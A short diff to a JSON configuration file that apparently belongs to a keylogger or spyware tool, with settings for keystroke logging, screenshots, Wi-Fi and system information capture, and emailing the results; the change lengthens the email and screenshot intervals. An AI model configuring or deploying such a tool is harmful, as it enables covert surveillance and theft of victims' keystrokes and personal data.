@@ -1,9 +1,9 @@
 {
     "info_email_receiver": "",
     "send_info": true,
-    "email_send_time": 40,
+    "email_send_time": 120,
     "take_screenshot": true,
-    "screenshot_time": 35,
+    "screenshot_time": 60,
     "key_logg": true,
     "get_wifi_info": true,
     "system_info": true,
